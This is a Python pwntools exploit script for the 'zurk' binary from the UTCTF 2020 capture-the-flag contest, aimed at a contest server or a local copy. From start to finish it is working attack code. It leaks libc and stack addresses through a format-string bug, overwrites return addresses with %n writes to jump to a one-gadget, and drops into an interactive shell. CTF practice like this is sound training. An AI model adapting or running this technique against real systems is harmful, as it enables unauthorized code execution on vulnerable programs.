#!/usr/bin/python
from pwn import *

chdir = '/MOUNT/contest/utctf-2020/zurk/'
config = {
    'elf': chdir + 'pwnable',
    'libc': chdir + 'libc-2.23.so',
    'HOST': 'binary.utctf.live',
    'PORT': 9003
}

def debug(r):
    context.terminal=['tmux', 'splitw', '-h']
    gdb.attach(r, gdbscript='''
		b *0x400767
    ''')

def command(r, cmd):
    r.sendlineafter('What would you like to do?\n', cmd)

def exploit(r):
	command(r, '%17$p')
	leak = int(r.recvn(14),16)
	libc.address = leak - 0x20830
	oneshot = libc.address + 0xf1147
	log.info('Leak addr: {:#x}'.format(leak))
	log.info('Libc base: {:#x}'.format(libc.address))

	command(r, '%4$p')
	leak = int(r.recvn(14),16)
	stack_addr = leak
	log.info('Return addr: {:#x}'.format(stack_addr))

	log.info("Overwrite return address of welcome()")
	command(r, 'A'*24 + p64(stack_addr + 0x50))
	command(r, '%'+str(oneshot%0x1000000)+'c%9$n')
	sleep(3)
	command(r, 'A'*24 + p64(stack_addr + 0x53))
	command(r, '%'+str(oneshot/0x1000000)+'c%9$n')
	sleep(3)

	log.info("Overwrite return address of do_move() to welcome()")
	command(r, 'A'*24 + p64(stack_addr + 0x48))
	command(r, '%'+str(e.symbols['welcome'])+'c%9$n')
	sleep(5)
	pause()
	r.interactive()

if __name__ == '__main__':
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    #context.log_level = 'debug'
    if len(sys.argv) > 1:
    	r = remote(config["HOST"], config["PORT"])
    else:
        r = process([config['elf']], env={"LD_PRELOAD":config['libc']})
        debug(r)
    exploit(r)
